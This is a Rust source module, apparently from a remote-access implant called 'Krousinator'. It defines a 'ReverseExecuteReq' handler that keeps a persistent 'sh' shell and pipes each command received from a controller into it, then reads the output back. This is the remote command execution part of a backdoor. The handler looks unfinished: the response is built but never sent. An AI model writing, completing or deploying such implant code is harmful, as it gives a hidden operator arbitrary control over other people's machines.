use crate::models::send::producer::Producer;
use crate::registry::handle::Handleable;
use crate::registry::krousinator_interface::KrousinatorInterface;
use serde::Deserialize;
use crate::register_handler;
use std::process::{Command, Stdio, Child};
use once_cell::sync::Lazy;
use std::io::{Read, Write};
use std::sync::Mutex;
use super::super::send::send_confirm_response::ConfirmResponseSend;

static SHELL: Lazy<Mutex<Child>> = Lazy::new(|| {
    let child = Command::new("sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("failed to start shell");
    
    Mutex::new(child)
});

#[derive(Deserialize, Debug)]
pub struct ReverseExecuteReq {
    _t: String,
    payload: String // full command
}


impl Handleable for ReverseExecuteReq {
    
    fn handle(&self, ctx: &mut KrousinatorInterface) {
        let mut shell = SHELL.lock().unwrap();
        let stdin = shell.stdin.as_mut().unwrap();
        stdin.write_all(format!("{}\n", self.payload).as_bytes()).unwrap();
        
        let stout = shell.stdout.as_mut().unwrap();
        let mut buf: [u8; 1000] = [0; 1000];
        stout.read(&mut buf).unwrap();
        let string = String::from_utf8_lossy(&buf);
        println!("stout output: {}", string);

        let confirm = ConfirmResponseSend::produce();
        // 2
        
    }
}

register_handler!(ReverseExecuteReq);